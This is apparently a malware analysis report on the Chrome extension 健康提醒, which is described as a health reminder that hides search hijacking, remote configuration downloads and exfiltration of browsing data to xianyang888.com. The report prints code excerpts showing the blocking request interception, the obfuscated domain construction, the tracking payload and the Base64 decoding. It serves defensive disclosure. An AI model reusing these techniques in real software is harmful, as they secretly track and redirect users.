# Vulnerability Report: 健康提醒

## Metadata
- **Extension ID**: gefpceefdmmojbgmfmnkeanmpclobjgj
- **Extension Name**: 健康提醒 (Health Reminder)
- **Version**: 1.0.13
- **Users**: ~200,000
- **Manifest Version**: 2
- **Analysis Date**: 2026-02-15

## Executive Summary

This extension presents itself as a health reminder tool for drinking water and eye exercises (健康提醒 translates to "Health Reminder"). However, the background script contains sophisticated search hijacking and traffic redirection code that operates completely hidden from users. The extension intercepts all web requests using `webRequestBlocking` permissions on `<all_urls>`, analyzes URLs for specific patterns (especially search engines), and redirects user navigation through affiliate tracking domains. The malicious code downloads remote configuration from `www.xianyang888.com` (domain is obfuscated in the code), exfiltrates browsing data, and injects affiliate parameters into search queries. This behavior is entirely undisclosed and represents a significant privacy violation affecting 200,000 users.

The legitimate health reminder functionality appears to work as advertised, but serves as a Trojan horse for the hidden monetization scheme. The extension uses time-based checks, localStorage tracking, and MD5 hashing to manage redirection frequency and avoid detection.

## Vulnerability Details

### 1. HIGH: Hidden Search Hijacking and Traffic Redirection

**Severity**: HIGH
**Files**: js/bg.js
**CWE**: CWE-506 (Embedded Malicious Code)

**Description**: The background script implements a complete search hijacking framework that intercepts all user navigation and redirects specific patterns through affiliate/tracking domains.

**Evidence**:
```javascript
// webRequest listener intercepts all HTTP requests
chrome.webRequest.onBeforeRequest.addListener(o,{urls:["<all_urls>"]},["blocking"])

// Search query extraction and redirection logic
if(l(t,f.i[0])){
  e=!0;
  let n=new RegExp("(?<=word=).*?(?=&)","is"),r=t.match(n);
  null!=r&&(a=r[0])
}
if(l(t,f.i[1])){
  e=!0;
  let n=new RegExp("(?<=wd=).*?(?=&)","is"),r=t.match(n);
  null!=r&&(a=r[0])
}
// Constructs redirect URL with extracted search query
(null==e||(new Date).getTime()-parseInt(e.slice(0,13))>6e4*f.c)&&
  (o=f.h+encodeURIComponent(f.b+a+"&ie=utf-8"))

// Returns redirect to intercept navigation
if(""!=e){
  if(!r)return a&&n(c),d(o,i),{redirectUrl:e};
  if(b)return a&&n(c),d(o,i),{redirectUrl:e}
}
```

The code extracts search parameters (`word=`, `wd=`) from URLs, applies time-based throttling (60-second intervals based on `6e4*f.c`), and redirects through external domains.

**Verdict**: HIGH severity. This is undisclosed search hijacking affecting all user navigation. The extension monitors `<all_urls>` in blocking mode and redirects traffic based on remote configuration.

### 2. HIGH: Data Exfiltration and Remote Tracking

**Severity**: HIGH
**Files**: js/bg.js
**CWE**: CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor)

**Description**: The extension exfiltrates detailed browsing and navigation data to external tracking servers at `www.xianyang888.com`.

**Evidence**:
```javascript
// Obfuscated domain construction (decoded to http://www.xianyang888.com)
let n="h";
n+=u("t",2),  // "tt"
n+=u("p",1),  // "p"
n+=u("w",3),  // "www"
n+=".xi",n+="an",n+="ya",n+="ng",
n+=u("8",3),  // "888"
n+=".com",
n+="/web/",n+="xylog",n+=".lg?";

// Data payload sent to tracking server
let n={
  a:t.bulo.bc.a,
  b:t.bulo.bc.b,
  c:t.bulo.bc.c,
  d:chrome.app.getDetails().version,  // Extension version
  e:(new Date).getTime(),              // Timestamp
  f:79,
  g:0,
  h:e,  // Original URL being redirected
  i:a(), // UUID generated for user
  j:103,
  l:201,
  m:0,
  p:65,
  s:1
};

// Double Base64 encoding before transmission
let i=new x;
r+=i.encode(i.encode(o))
```

The function `a()` generates a UUID (`"xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx"`) to track individual users. The extension reports original URLs (`h:e` in payload), extension version, timestamps, and unique user identifiers.

**Verdict**: HIGH severity. Hidden data exfiltration to third-party tracking server with double-encoded payloads to obfuscate network traffic. Users are not informed their browsing data is being transmitted externally.

### 3. MEDIUM: Remote Configuration Download

**Severity**: MEDIUM
**Files**: js/bg.js
**CWE**: CWE-494 (Download of Code Without Integrity Check)

**Description**: The extension downloads remote configuration from `www.xianyang888.com` that controls redirection behavior, target domains, and injection patterns.

**Evidence**:
```javascript
// Downloads remote config on initialization
$.ajax({url:i,type:"get",data:"",timeout:2e3,
  success:function(e){l(e)},
  error:function(e,t,n){"timeout"==t&&(e.abort(),
    setTimeout(()=>{
      $.ajax({url:i,type:"get",data:"",timeout:2e3,
        success:function(e){l(e)},
        error:function(e,t,n){"timeout"==t&&e.abort()}
      })
    },5e3)
  )}
})

// Parses triple-Base64 encoded response
p=JSON.parse(o.decode(o.decode(o.decode(e))))
null!=p.jtsk&&(m=p.jtsk)

// Stores config in chrome.storage.local
s({bulo:t},(function(){}))
```

The remote configuration (`p` object) controls which domains to intercept, redirection targets, and throttling parameters. The config is triple-Base64 decoded and includes a `jtsk` array that's injected into content scripts via messaging.

**Verdict**: MEDIUM severity. Remote configuration allows the operator to change malicious behavior dynamically without updating the extension. No integrity checks are performed on downloaded configuration.

## False Positives Analysis

The legitimate health reminder functionality (water drinking and eye exercise schedules) is real and functional:

- `popup.js` contains genuine UI code for managing reminder schedules
- Water reminder defaults: 7 times per day (07:00, 09:00, 11:00, 12:30, 16:00, 18:30, 21:00)
- Eye exercise defaults: 2 times per day (10:00, 15:00)
- Reminders are displayed via content script injection (notice.js) with CSS overlay
- All reminder data is stored in chrome.storage.local

However, this legitimate functionality does NOT excuse the hidden malicious behavior. The extension operates as a Trojan horse - the health reminder is the advertised feature, while search hijacking/tracking is the hidden monetization mechanism.

The obfuscated domain construction (`u("t",2) + u("p",1) + "://www." + "xianyang" + u("8",3) + ".com"`) is clearly intentional obfuscation to avoid static analysis detection.

## API Endpoints Analysis

| Endpoint | Purpose | Data Sent | Risk |
|----------|---------|-----------|------|
| www.xianyang888.com/web/xylog.lg | Tracking/analytics | User ID (UUID), original URLs, extension version, timestamps, double-Base64 encoded | HIGH - Data exfiltration |
| www.xianyang888.com/ap/netStatus | Config download | None (GET request) | MEDIUM - Remote code/config |
| gd.gov.cn | Unknown | Possibly test/whitelist URL | LOW - Appears in hardcoded config |
| www.gd.gov.cn | Unknown | Possibly test/whitelist URL | LOW - Appears in hardcoded config |

The `xianyang888.com` domain appears to be a Chinese advertising/affiliate network. All communication uses Base64 encoding (double or triple) to obfuscate payload contents from network inspection.

## Overall Risk Assessment

**RISK LEVEL: HIGH**

**Justification**:

1. **Undisclosed Data Collection**: The extension exfiltrates browsing data to third-party servers without user knowledge or consent, violating Chrome Web Store policies and user privacy expectations.

2. **Hidden Functionality**: The search hijacking and redirection code is completely hidden from users. The extension description only mentions health reminders - there is no disclosure of traffic interception, URL modification, or data transmission.

3. **Broad Permissions Abuse**: The extension requests `webRequest`, `webRequestBlocking`, and `<all_urls>` permissions ostensibly for a health reminder feature that doesn't require any of these permissions. This represents severe permission over-requesting.

4. **Intentional Obfuscation**: The domain construction uses string concatenation and helper functions specifically to evade static analysis. Variable names are minified beyond normal webpack bundling. This demonstrates malicious intent.

5. **Scale of Impact**: With 200,000 users, this represents a significant privacy violation affecting hundreds of thousands of people who believe they're installing a simple health utility.

6. **Monetization Without Disclosure**: The affiliate injection and traffic redirection represents undisclosed monetization through user traffic manipulation.

**Recommended Actions**:
- Remove from Chrome Web Store immediately
- Users should uninstall this extension
- Report to Google Safe Browsing for malware classification
- The developer has demonstrated clear malicious intent and should be banned from the Web Store

This extension is NOT a borderline case - it contains deliberately hidden malicious functionality wrapped in a legitimate-seeming health tool. The obfuscation, undisclosed data exfiltration, and search hijacking clearly violate Web Store policies and constitute malware.
